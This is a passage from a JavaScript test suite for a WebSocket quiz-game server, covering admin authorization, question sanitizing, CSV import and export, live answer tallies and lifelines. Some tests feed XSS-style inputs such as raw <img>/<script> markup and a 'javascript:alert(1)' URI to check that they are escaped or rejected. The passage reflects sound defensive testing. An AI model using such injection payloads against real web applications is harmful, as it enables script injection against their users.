    const storedQ      = updated.questions[0].q;
    const storedLesson = updated.questions[0].lesson;
    ok(!storedQ.includes('<img'), 'stored question text has no raw <img>: ' + JSON.stringify(storedQ));
    ok(storedQ.includes('&lt;img'), 'stored question text has escaped &lt;img>');
    ok(!storedLesson.includes('<script>'), 'stored lesson text has no raw <script>: ' + JSON.stringify(storedLesson));
    try { ws.close(); } catch {}
  }

  section('WS: questions:update is rejected when not signed in as admin (A01-2)');
  {
    // host cookie should NOT be able to fire admin actions.
    const { cookie } = await loginAs('host', process.env.HOST_TOKEN);
    const ws = await openWs({ cookie });
    ws.send(JSON.stringify({ type: 'host:hello' }));
    const before = await waitMessage(ws, m => m.type === 'host:state');
    const beforeFirstQ = before.state.currentQuestion ? before.state.currentQuestion.q : null;
    const beforeTotal = before.state.totalQuestions;
    ok(/^\d{6}$/.test(before.state.joinCode), 'host state exposes a 6-digit join code');

    // Try to overwrite with a known sentinel that we can detect afterwards.
    const sentinel = 'SENTINEL_HOST_INJECTION_' + Date.now();
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'questions:update',
      payload: {
        main: [{ q: sentinel, options:['a','b','c','d'], correct: 0, lesson: '' }],
        bonus: []
      }
    }));
    await new Promise(r => setTimeout(r, 200));

    // Re-request state and confirm the sentinel is nowhere to be seen.
    ws.send(JSON.stringify({ type: 'host:hello' }));
    const after = await waitMessage(ws, m => m.type === 'host:state');
    const sentinelInQuestion = after.state.currentQuestion && after.state.currentQuestion.q && after.state.currentQuestion.q.includes(sentinel);
    ok(!sentinelInQuestion, 'host cookie cannot inject sentinel into the question bank');
    ok(after.state.totalQuestions === beforeTotal, `host cookie did not change totalQuestions (was ${beforeTotal}, now ${after.state.totalQuestions})`);
    try { ws.close(); } catch {}
  }
}

// ----------------------------------------------------------------------------
// BONUS_questions bug-fix tests (game logic)
// ----------------------------------------------------------------------------
async function bonusBugTest() {
  section('Bug fix: bonusQuestions identifier (was BONUS_questions)');
  // Admin can call /lessons.json now; before the fix this route threw.
  const { cookie } = await loginAs('admin', process.env.ADMIN_TOKEN);
  const r = await request('GET', '/lessons.json', { headers: { Cookie: cookie } });
  ok(r.status === 200, 'GET /lessons.json → 200 (no ReferenceError thrown)');
  try {
    const j = JSON.parse(r.body);
    ok(Array.isArray(j.main) && Array.isArray(j.bonus), '/lessons.json returns {main, bonus} arrays');
    ok(j.bonus.length > 0, 'bonus array is non-empty');
  } catch (e) {
    ok(false, '/lessons.json returns JSON: ' + e.message);
  }
}

// ----------------------------------------------------------------------------
// Per-question images
// ----------------------------------------------------------------------------
async function questionImageTests() {
  section('Image: sanitizeQuestionImage unit');
  // Smallest valid PNG (8-byte signature + tiny IHDR — base64 of 8 random bytes).
  const tinyPng = 'data:image/png;base64,' + Buffer.from('PNG-data-stub').toString('base64');
  ok(sanitizeQuestionImage(tinyPng) === tinyPng, 'valid PNG data URI accepted');
  ok(sanitizeQuestionImage('') === '', 'empty string returns empty');
  ok(sanitizeQuestionImage('https://example.com/img.png') === '', 'plain URL rejected (data URI only)');
  ok(sanitizeQuestionImage('data:text/html;base64,Zm9v') === '', 'wrong MIME rejected');
  ok(sanitizeQuestionImage('data:image/gif;base64,AAAA') === '', 'GIF rejected (not on allowlist)');
  ok(sanitizeQuestionImage('javascript:alert(1)') === '', 'javascript: scheme rejected');
  const big = 'data:image/png;base64,' + 'A'.repeat(300 * 1024);
  ok(sanitizeQuestionImage(big) === '', 'oversize image rejected');

  section('Image: persisted via questions:update and surfaced in host state');
  const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
  const ws = await openWs({ cookie: admin.cookie });
  ws.send(JSON.stringify({ type: 'admin:hello' }));
  await waitMessage(ws, m => m.type === 'admin:init');

  // Reset defaults first so we have a stable bank.
  ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
  await waitMessage(ws, m => m.type === 'admin:questions');

  // Update Q1 to include an image (need to keep all the other fields valid).
  ws.send(JSON.stringify({
    type: 'admin:action', action: 'questions:update',
    payload: {
      main: [{
        q: 'Test Q with image',
        options: ['a', 'b', 'c', 'd'],
        correct: 0,
        lesson: 'lesson text',
        image: tinyPng
      }],
      bonus: [{ q: 'b', options: ['1','2','3','4'], correct: 0, lesson: '' }]
    }
  }));
  const updated = await waitMessage(ws, m => m.type === 'admin:questions');
  ok(updated.questions[0].image === tinyPng, 'image persisted on the stored question');

  // The host state push should expose the image.
  // We can't easily start a game from here without restarting fixture, so
  // verify the admin currentQuestionRef has it once we advance.
  try { ws.close(); } catch {}
}

// ----------------------------------------------------------------------------
// CSV parse / stringify / import
// ----------------------------------------------------------------------------
async function csvTests() {
  section('CSV: parser handles quotes, commas, newlines');
  const rows1 = parseCsv('a,b,c\n1,"2,2",3\n');
  ok(rows1.length === 2 && rows1[0].join('|') === 'a|b|c' && rows1[1].join('|') === '1|2,2|3', 'comma inside quotes preserved');
  const rows2 = parseCsv('a\n"line one\nline two"\n');
  ok(rows2[1][0] === 'line one\nline two', 'newline inside quotes preserved');
  const rows3 = parseCsv('a\n"she said ""hi"""\n');
  ok(rows3[1][0] === 'she said "hi"', 'escaped double-quote');
  const rows4 = parseCsv('﻿a,b\n1,2\n');
  ok(rows4[0].join('|') === 'a|b', 'BOM stripped from header');

  section('CSV: stringifier round-trips');
  const original = [['a','b'],['hello, world','line1\nline2'],['she said "hi"','plain']];
  const text = stringifyCsv(original);
  const parsed = parseCsv(text);
  ok(JSON.stringify(parsed) === JSON.stringify(original), 'stringify → parse round-trip');

  section('CSV: questionsToCsv emits the expected header + section column');
  const csv = questionsToCsv(
    [{ q: 'Q1', options: ['a','b','c','d'], correct: 1, lesson: 'L1', image: '' }],
    [{ q: 'B1', options: ['1','2','3','4'], correct: 0, lesson: 'BL1', image: '' }]
  );
  ok(csv.startsWith('"section"'), 'starts with section column header');
  ok(csv.includes('"main"'),  'main row emitted');
  ok(csv.includes('"bonus"'), 'bonus row emitted');
  ok(csv.includes('"B"'),     'correct exported as letter');

  section('CSV: questionsFromCsv parses + validates');
  // Good CSV
  const good = questionsFromCsv(
    'section,question,optionA,optionB,optionC,optionD,correct,lesson\n' +
    'main,"Q1?",one,two,three,four,A,"Lesson 1"\n' +
    'main,"Q2?",1,2,3,4,3,"Lesson 2"\n' +
    'bonus,"Bonus?",a,b,c,d,B,"Tiebreaker"\n'
  );
  ok(good.main.length === 2 && good.bonus.length === 1, 'split into main/bonus correctly');
  ok(good.main[0].correct === 0, 'letter "A" → index 0');
  ok(good.main[1].correct === 3, 'numeric "3" → index 3');
  ok(good.bonus[0].correct === 1, 'letter "B" → index 1');

  // Bad CSV — missing column
  let threw = false;
  try { questionsFromCsv('question,optionA\nQ,a\n'); } catch { threw = true; }
  ok(threw, 'missing column rejected');

  // Bad CSV — invalid section
  threw = false;
  try { questionsFromCsv('section,question,optionA,optionB,optionC,optionD,correct,lesson\nxxx,Q,a,b,c,d,A,L\n'); } catch { threw = true; }
  ok(threw, 'invalid section value rejected');

  // Bad CSV — invalid correct
  threw = false;
  try { questionsFromCsv('section,question,optionA,optionB,optionC,optionD,correct,lesson\nmain,Q,a,b,c,d,Z,L\n'); } catch { threw = true; }
  ok(threw, 'invalid correct value rejected');

  // Bad CSV — missing option
  threw = false;
  try { questionsFromCsv('section,question,optionA,optionB,optionC,optionD,correct,lesson\nmain,Q,a,b,c,,A,L\n'); } catch { threw = true; }
  ok(threw, 'missing option rejected');

  section('CSV: import via admin WS replaces the bank');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    // Reset to defaults first so the next assertion is meaningful.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(ws, m => m.type === 'admin:questions');

    const csvText =
      'section,question,optionA,optionB,optionC,optionD,correct,lesson\n' +
      'main,"Imported Q1",alpha,beta,gamma,delta,B,"Imported lesson 1"\n' +
      'main,"Imported Q2",one,two,three,four,A,"Imported lesson 2"\n' +
      'bonus,"Tiebreaker?",red,green,blue,yellow,C,"Tiebreaker lesson"\n';
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:import-csv', payload: { csv: csvText } }));
    const result = await waitMessage(ws, m => m.type === 'questions:imported' || m.type === 'error', 3000);
    ok(result.type === 'questions:imported', `import succeeded (no error: ${result.error || ''})`);
    ok(result.mainCount === 2 && result.bonusCount === 1, 'counts match the CSV');

    // Also confirm via admin:questions push that the new content arrived.
    // (admin:questions fires before questions:imported, so re-pull current state.)
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    const init = await waitMessage(ws, m => m.type === 'admin:init', 2000);
    ok(init.questions.length === 2 && init.questions[0].q.includes('Imported Q1'), 'banks now reflect the CSV');
    try { ws.close(); } catch {}
  }

  section('CSV: import rejects a bonus-only bank');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: admin.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    const bonusOnly =
      'section,question,optionA,optionB,optionC,optionD,correct,lesson\n' +
      'bonus,"Only bonus?",a,b,c,d,A,"No main questions"\n';
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:import-csv', payload: { csv: bonusOnly } }));
    const rejected = await waitMessage(ws, m => m.type === 'questions:imported' || m.type === 'error', 3000);
    ok(rejected.type === 'error' && /at least one main/i.test(rejected.error || ''), 'bonus-only CSV import rejected');
    try { ws.close(); } catch {}
  }

  section('CSV: HTTP /questions.csv and /questions-template.csv (admin gated)');
  {
    const admin = await loginAs('admin', process.env.ADMIN_TOKEN);
    const r1 = await request('GET', '/questions.csv', { headers: { Cookie: admin.cookie } });
    ok(r1.status === 200, '/questions.csv → 200 with admin cookie');
    ok(/text\/csv/.test(r1.headers['content-type'] || ''), 'Content-Type is text/csv');
    ok(r1.body.startsWith('"section"'), 'export begins with the header row');

    const r2 = await request('GET', '/questions-template.csv', { headers: { Cookie: admin.cookie } });
    ok(r2.status === 200, '/questions-template.csv → 200 with admin cookie');
    ok(r2.body.includes('"Sample question'), 'template contains the example main row');
    ok(r2.body.includes('"Sample tiebreaker'), 'template contains the example bonus row');

    const r3 = await request('GET', '/questions.csv');
    ok(r3.status === 302, '/questions.csv unauthenticated → redirect to login');
  }
}

// ----------------------------------------------------------------------------
// Live answer tally + change tracking
// ----------------------------------------------------------------------------
async function liveTallyTests() {
  async function adminWs() {
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    // Drain the post-hello admin:state push so downstream awaitState calls
    // don't accidentally consume it. Without this drain, a prior test that
    // happens to have left phase=lobby will cause the first awaitState(phase==='lobby')
    // to return the stale pre-reset state with the OLD joinCode, and the
    // subsequent player:join then fails with "Wrong join code".
    await waitMessage(ws, m => m.type === 'admin:state', 2000).catch(() => null);
    return ws;
  }
  function fireHost(ws, action, payload) {
    ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: action, hostPayload: payload || {} } }));
  }
  async function awaitState(ws, pred, timeout = 3000) {
    const start = Date.now();
    let last = null;
    while (Date.now() - start < timeout) {
      const m = await waitMessage(ws, x => x.type === 'admin:state', 1000).catch(() => null);
      if (!m) continue;
      last = m;
      if (pred(m.state)) return m;
    }
    throw new Error('awaitState timed out; last phase=' + (last && last.state.phase));
  }

  // Ensure questions exist so we can transition into question phase.
  {
    const ws = await adminWs();
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(ws, m => m.type === 'admin:questions', 3000);
    try { ws.close(); } catch {}
  }

  section('Live tally: visible on admin state, counts + changes increment correctly');
  {
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    const s0 = await awaitState(ws, s => s.phase === 'lobby');
    const joinCode = s0.state.joinCode;

    // Join two players (sequenced so each WS state push is consumed by the
    // admin awaitState before the next one — otherwise multiple pushes can
    // arrive within a single tick and waitMessage drops the older ones).
    const p1 = await openWs();
    p1.send(JSON.stringify({ type: 'player:join', name: 'A', email: 'a@test.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');
    const p2 = await openWs();
    p2.send(JSON.stringify({ type: 'player:join', name: 'B', email: 'b@test.example', joinCode }));
    await waitMessage(p2, m => m.type === 'player:joined');
    await awaitState(ws, s => s.playerCount === 2);

    fireHost(ws, 'start-game');
    let s = await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 0);
    ok(s.state.liveAnswerTally, 'admin state carries liveAnswerTally during question phase');
    ok(s.state.liveAnswerTally.answeredAlive === 0, 'fresh question: 0 answered');
    ok(s.state.liveAnswerTally.changeEvents === 0, 'fresh question: 0 change events');

    // Sequence each answer so the admin awaitState can consume each push.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    await awaitState(ws, s => s.liveAnswerTally && s.liveAnswerTally.answeredAlive === 1);
    p2.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    s = await awaitState(ws, s => s.liveAnswerTally && s.liveAnswerTally.answeredAlive === 2);
    ok(s.state.liveAnswerTally.counts[0] === 2, '2 players currently on option A');
    ok(s.state.liveAnswerTally.changeEvents === 0, 'no changes yet');
    ok(s.state.liveAnswerTally.playersWhoChanged === 0, 'no distinct changers yet');

    // p1 changes their answer to option 1.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 1 }));
    s = await awaitState(ws, s => s.liveAnswerTally && s.liveAnswerTally.changeEvents >= 1);
    ok(s.state.liveAnswerTally.changeEvents === 1, 'one change event recorded');
    ok(s.state.liveAnswerTally.playersWhoChanged === 1, 'one distinct player changed');
    ok(s.state.liveAnswerTally.counts[1] === 1 && s.state.liveAnswerTally.counts[0] === 1, 'counts redistributed (A=1, B=1)');

    // p1 swaps again — same player, 2 events, 1 distinct.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    s = await awaitState(ws, s => s.liveAnswerTally && s.liveAnswerTally.changeEvents >= 2);
    ok(s.state.liveAnswerTally.changeEvents === 2, 'second change increments event total');
    ok(s.state.liveAnswerTally.playersWhoChanged === 1, 'distinct changer count unchanged (still p1 only)');

    // Same value re-submit → no new change.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    await new Promise(r => setTimeout(r, 200));
    fireHost(ws, 'cancel-lifeline-vote'); // no-op push
    const noChange = await awaitState(ws, s => s.liveAnswerTally && s.liveAnswerTally.changeEvents >= 0);
    ok(noChange.state.liveAnswerTally.changeEvents === 2, 'identical re-submit does not increment');

    // Close & advance → tally resets for Q2.
    fireHost(ws, 'close-question');
    await awaitState(ws, s => s.phase === 'reveal');
    fireHost(ws, 'next-question');
    const q2 = await awaitState(ws, s => s.phase === 'question' && s.questionIndex === 1);
    ok(q2.state.liveAnswerTally.answeredAlive === 0, 'Q2: counts reset');
    ok(q2.state.liveAnswerTally.changeEvents === 0, 'Q2: change events reset');
    ok(q2.state.liveAnswerTally.playersWhoChanged === 0, 'Q2: distinct changers reset');

    try { ws.close(); p1.close(); p2.close(); } catch {}
  }

  section('Live tally: eliminatedCanAnswer gate');
  {
    // Get a player into an "eliminated" state, then verify their answer is
    // rejected when the toggle is off and accepted (with tally split) when on.
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    let s = await awaitState(ws, s => s.phase === 'lobby');
    const joinCode = s.state.joinCode;

    const p1 = await openWs();
    p1.send(JSON.stringify({ type: 'player:join', name: 'Survivor', email: 'survivor@test.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');
    const p2 = await openWs();
    p2.send(JSON.stringify({ type: 'player:join', name: 'Doomed', email: 'doomed@test.example', joinCode }));
    await waitMessage(p2, m => m.type === 'player:joined');
    await awaitState(ws, x => x.playerCount === 2);

    fireHost(ws, 'start-game');
    await awaitState(ws, x => x.phase === 'question' && x.questionIndex === 0);

    // Q1 correct=1 in the sample bank. Doomed picks wrong (0); Survivor picks right (1).
    p2.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    await awaitState(ws, x => x.liveAnswerTally && x.liveAnswerTally.answeredAlive === 1);
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 1 }));
    await awaitState(ws, x => x.liveAnswerTally && x.liveAnswerTally.answeredAlive === 2);
    fireHost(ws, 'close-question');
    s = await awaitState(ws, x => x.phase === 'reveal');
    ok(s.state.aliveCount === 1, 'Doomed was eliminated');

    fireHost(ws, 'next-question');
    await awaitState(ws, x => x.phase === 'question' && x.questionIndex === 1);

    // Default: eliminatedCanAnswer=false. Doomed tries to answer — server ignores.
    p2.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    await new Promise(r => setTimeout(r, 200));
    fireHost(ws, 'cancel-lifeline-vote');  // pump state push
    let s2 = await awaitState(ws, x => x.liveAnswerTally !== null);
    ok(s2.state.liveAnswerTally.answeredEliminated === 0, 'with toggle OFF, eliminated answer not recorded');

    // Flip the toggle ON.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { eliminatedCanAnswer: true } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved' || m.type === 'error');

    p2.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    s2 = await awaitState(ws, x => x.liveAnswerTally && x.liveAnswerTally.answeredEliminated === 1);
    ok(s2.state.liveAnswerTally.eliminatedCounts[2] === 1, 'with toggle ON: eliminated counts include their pick');
    ok(s2.state.liveAnswerTally.answeredAlive === 0, 'alive count separate from eliminated');

    // Even with the toggle on, eliminated players never re-enter the prize race.
    // Q2 correct=2 in the sample bank, so Survivor picks 2 to stay alive; Doomed
    // already picked 2 above — match wouldn't matter since they can't be revived.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    await awaitState(ws, x => x.liveAnswerTally && x.liveAnswerTally.answeredAlive === 1);
    fireHost(ws, 'close-question');
    s2 = await awaitState(ws, x => x.phase === 'reveal');
    ok(s2.state.aliveCount === 1, 'Doomed still eliminated even with correct tap (no revive)');

    // Reset to default for subsequent tests.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { eliminatedCanAnswer: false } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); p1.close(); p2.close(); } catch {}
  }

  section('Lifelines: per-type accounting + refill schedule');
  {
    // Two coverage goals here:
    //   1. Each lifeline type is independent — using 50/50 leaves askit + skip
    //      still available on the same question.
    //   2. The refill schedule actually fires when configured ('each-question').
    const ws = await adminWs();
    fireHost(ws, 'reset-game');
    let s = await awaitState(ws, x => x.phase === 'lobby');

    // Default to 'never' refill — single set per game.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { lifelineRefill: 'never' } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');

    const joinCode = s.state.joinCode;
    const p1 = await openWs();
    p1.send(JSON.stringify({ type: 'player:join', name: 'Lifeline Lou', email: 'lou@test.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');
    await awaitState(ws, x => x.playerCount === 1);
    fireHost(ws, 'start-game');
    s = await awaitState(ws, x => x.phase === 'question' && x.questionIndex === 0);

    // Baseline — nothing is used.
    ok(s.state.lifelinesUsed && s.state.lifelinesUsed['5050'] === false, 'baseline: 5050 unused');
    ok(s.state.lifelinesUsed['askit'] === false, 'baseline: askit unused');
    ok(s.state.lifelinesUsed['skip'] === false, 'baseline: skip unused');
    ok(s.state.lifelineUsed === false, 'baseline: legacy boolean false (not all spent)');

    // Apply 50/50 directly. Then askit + skip must still be available.
    ws.send(JSON.stringify({ type: 'host:action', action: 'apply-lifeline', payload: { type: '5050' } }));
    s = await awaitState(ws, x => x.lifelinesUsed && x.lifelinesUsed['5050'] === true);
    ok(s.state.lifelinesUsed['5050'] === true, '5050 marked spent');
    ok(s.state.lifelinesUsed['askit'] === false, 'askit STILL available after 5050');
    ok(s.state.lifelinesUsed['skip'] === false, 'skip STILL available after 5050');
    ok(s.state.lifelineUsed === false, 'legacy boolean still false (one of three spent)');
    ok(s.state.eliminatedOptions && s.state.eliminatedOptions.length === 2, '5050 removed two wrong options');

    // Apply Ask IT on the SAME question — must succeed.
    ws.send(JSON.stringify({ type: 'host:action', action: 'apply-lifeline', payload: { type: 'askit' } }));
    s = await awaitState(ws, x => x.lifelinesUsed && x.lifelinesUsed['askit'] === true);
    ok(s.state.lifelinesUsed['askit'] === true, 'askit can be used on same question as 5050');
    ok(s.state.lifelinesUsed['skip'] === false, 'skip still available after 5050 + askit');

    // Try to re-use 5050 — should be rejected (still phase=question).
    ws.send(JSON.stringify({ type: 'host:action', action: 'apply-lifeline', payload: { type: '5050' } }));
    await new Promise(r => setTimeout(r, 150));
    // No state change expected; latest snapshot must still show only two used.
    ok(s.state.lifelinesUsed['5050'] === true && s.state.lifelinesUsed['skip'] === false, 're-use of 5050 was a no-op');

    // Apply Skip — phase moves to reveal and all three are spent.
    ws.send(JSON.stringify({ type: 'host:action', action: 'apply-lifeline', payload: { type: 'skip' } }));
    s = await awaitState(ws, x => x.phase === 'reveal');
    ok(s.state.lifelinesUsed['skip'] === true, 'skip marked spent');
    ok(s.state.lifelineUsed === true, 'legacy boolean true once all three spent');

    // Now move to Q2 with 'never' refill — all three should remain spent.
    fireHost(ws, 'next-question');
    s = await awaitState(ws, x => x.phase === 'question' && x.questionIndex === 1);
    ok(s.state.lifelinesUsed['5050'] === true && s.state.lifelinesUsed['askit'] === true && s.state.lifelinesUsed['skip'] === true,
       "never refill: all still spent on Q2");

    // Switch to 'each-question' and advance — the next question must refill.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { lifelineRefill: 'each-question' } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    // Close current question and move to Q3.
    fireHost(ws, 'close-question');
    await awaitState(ws, x => x.phase === 'reveal' && x.questionIndex === 1);
    fireHost(ws, 'next-question');
    s = await awaitState(ws, x => x.phase === 'question' && x.questionIndex === 2);
    ok(s.state.lifelinesUsed['5050'] === false && s.state.lifelinesUsed['askit'] === false && s.state.lifelinesUsed['skip'] === false,
       "each-question refill: Q3 has all three lifelines back");

    // Reset for downstream tests.
    ws.send(JSON.stringify({
      type: 'admin:action', action: 'branding:update',
      payload: { branding: { lifelineRefill: 'never' } }
    }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); p1.close(); } catch {}
  }

  section('Player state: history + correctCount + end-of-game review');
  {
    // Use a persistent admin-state tracker — captures every admin:state push so
    // we don't lose messages between awaits (the per-test awaitState helpers
    // use one-shot listeners which race with rapid pushAll bursts).
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    const adminLatest = { state: null };
    ws.on('message', raw => {
      try { const m = JSON.parse(raw); if (m.type === 'admin:state') adminLatest.state = m.state; } catch {}
    });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    async function until(pred, timeout = 4000) {
      const start = Date.now();
      while (Date.now() - start < timeout) {
        if (adminLatest.state && pred(adminLatest.state)) return adminLatest.state;
        await new Promise(r => setTimeout(r, 30));
      }
      throw new Error('until() timed out; last phase=' + (adminLatest.state && adminLatest.state.phase));
    }
    function fire(action, payload) {
      ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: action, hostPayload: payload || {} } }));
    }

    // Reset to a clean game with the sample bank. reset-game first (works in
    // any phase) so the subsequent reset-defaults isn't blocked by the prior
    // test leaving us in 'reveal' or 'question' phase.
    fire('reset-game');
    await until(x => x.phase === 'lobby');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(ws, m => m.type === 'admin:questions', 3000);
    const s = await until(x => x.phase === 'lobby' && x.totalQuestions === 10);
    const joinCode = s.joinCode;

    // Helper: capture the most recent player:state for one socket.
    function trackPlayer(pws) {
      const state = { last: null };
      pws.on('message', raw => {
        try { const m = JSON.parse(raw); if (m.type === 'player:state') state.last = m.state; } catch {}
      });
      return state;
    }

    const p1 = await openWs();
    const p1State = trackPlayer(p1);
    p1.send(JSON.stringify({ type: 'player:join', name: 'Alpha', email: 'alpha@review.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');

    // Enable engagement mode so eliminated players can keep tapping.
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { eliminatedCanAnswer: true } } }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    await until(x => x.playerCount === 1);

    fire('start-game');
    await until(x => x.phase === 'question' && x.questionIndex === 0);

    // Q1 correct=1; Alpha answers wrong (0) → will be eliminated.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    await until(x => x.liveAnswerTally && x.liveAnswerTally.answeredAlive === 1);
    fire('close-question');
    await until(x => x.phase === 'reveal');
    // Allow the post-close pushAll to land on the player.
    await new Promise(r => setTimeout(r, 100));
    ok(p1State.last && Array.isArray(p1State.last.you.history) && p1State.last.you.history.length === 1, 'history present after Q1 close');
    ok(p1State.last.you.history[0].correct === false, 'Q1 marked wrong in history');
    ok(p1State.last.you.correctCount === 0, 'correctCount=0 after a wrong answer');
    ok(p1State.last.you.answeredCount === 1, 'answeredCount=1');
    ok(p1State.last.you.alive === false, 'player eliminated');

    // Advance to Q2 — Alpha is eliminated but engagement mode lets them keep tapping.
    fire('next-question');
    await until(x => x.phase === 'question' && x.questionIndex === 1);
    // Q2 correct=2. Eliminated Alpha answers correctly (2) — counts as a correct
    // tally but doesn't revive them or score points.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 2 }));
    await until(x => x.liveAnswerTally && x.liveAnswerTally.answeredEliminated === 1);
    fire('close-question');
    await until(x => x.phase === 'reveal');
    await new Promise(r => setTimeout(r, 100));
    ok(p1State.last.you.history.length === 2, 'history grew to 2 entries');
    ok(p1State.last.you.history[1].correct === true, 'Q2 marked correct in history (eliminated player can still get correct)');
    ok(p1State.last.you.history[1].wasAlive === false, 'Q2 entry remembers player was already eliminated');
    ok(p1State.last.you.correctCount === 1, 'correctCount=1 includes post-elimination correct answers');
    ok(p1State.last.you.score === 0, 'score still 0 — eliminated players never accrue points');

    // The end-of-game review only appears when phase=end. Verify it's null during gameplay.
    ok(p1State.last.review == null, 'review payload null during question phase');

    // Walk to end. With only 1 player and they're already eliminated, after Q10
    // the game ends (no survivors path). Keep advancing next-question and
    // close-question alternately until phase = end.
    for (let i = 2; i < 12 && adminLatest.state.phase !== 'end'; i++) {
      fire('next-question');
      const ns = await until(x => x.phase === 'question' || x.phase === 'end');
      if (ns.phase === 'end') break;
      fire('close-question');
      await until(x => x.phase === 'reveal');
      await new Promise(r => setTimeout(r, 80));
    }
    // Give the last push a moment.
    for (let k = 0; k < 20 && (!p1State.last || p1State.last.phase !== 'end'); k++) {
      await new Promise(r => setTimeout(r, 100));
    }
    ok(p1State.last && p1State.last.phase === 'end', 'game reached end phase');
    ok(p1State.last.review && Array.isArray(p1State.last.review.main), 'review payload present at game end');
    ok(p1State.last.review.main.length > 0, 'review.main has questions');
    ok(p1State.last.review.main[0].correct != null, 'review exposes correct answer index');
    ok(typeof p1State.last.review.main[0].lesson === 'string', 'review exposes lesson text');

    // Cleanup
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { eliminatedCanAnswer: false } } }));
    await waitMessage(ws, m => m.type === 'branding:saved');
    try { ws.close(); p1.close(); } catch {}
  }

  section('CSV export: header + per-question history columns');
  {
    // Persistent admin-state tracker, same pattern as the player-state test.
    const a = await loginAs('admin', process.env.ADMIN_TOKEN);
    const ws = await openWs({ cookie: a.cookie });
    const adminLatest = { state: null };
    ws.on('message', raw => { try { const m = JSON.parse(raw); if (m.type === 'admin:state') adminLatest.state = m.state; } catch {} });
    ws.send(JSON.stringify({ type: 'admin:hello' }));
    await waitMessage(ws, m => m.type === 'admin:init');
    async function until(pred, timeout = 4000) {
      const start = Date.now();
      while (Date.now() - start < timeout) {
        if (adminLatest.state && pred(adminLatest.state)) return adminLatest.state;
        await new Promise(r => setTimeout(r, 30));
      }
      throw new Error('until() timed out; phase=' + (adminLatest.state && adminLatest.state.phase));
    }
    function fire(action) {
      ws.send(JSON.stringify({ type: 'admin:action', action: 'game:host-action', payload: { hostAction: action, hostPayload: {} } }));
    }

    fire('reset-game');
    await until(s => s.phase === 'lobby');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'questions:reset-defaults' }));
    await waitMessage(ws, m => m.type === 'admin:questions');
    await until(s => s.phase === 'lobby' && s.totalQuestions === 10);
    const joinCode = adminLatest.state.joinCode;

    // One player joins; engagement mode is enabled so eliminated players keep playing.
    const p1 = await openWs();
    p1.send(JSON.stringify({ type: 'player:join', name: 'CSV Test', email: 'csv@test.example', joinCode }));
    await waitMessage(p1, m => m.type === 'player:joined');
    ws.send(JSON.stringify({ type: 'admin:action', action: 'branding:update', payload: { branding: { eliminatedCanAnswer: true } } }));
    await waitMessage(ws, m => m.type === 'branding:saved');

    fire('start-game');
    await until(s => s.phase === 'question' && s.questionIndex === 0);
    // Q1 correct=1 — player picks wrong (0) → eliminated.
    p1.send(JSON.stringify({ type: 'player:answer', answerIndex: 0 }));
    await until(s => s.liveAnswerTally && s.liveAnswerTally.answeredAlive === 1);
    fire('close-question');
    await until(s => s.phase === 'reveal');
    fire('next-question');
    await until(s => s.phase === 'question' && s.questionIndex === 1);
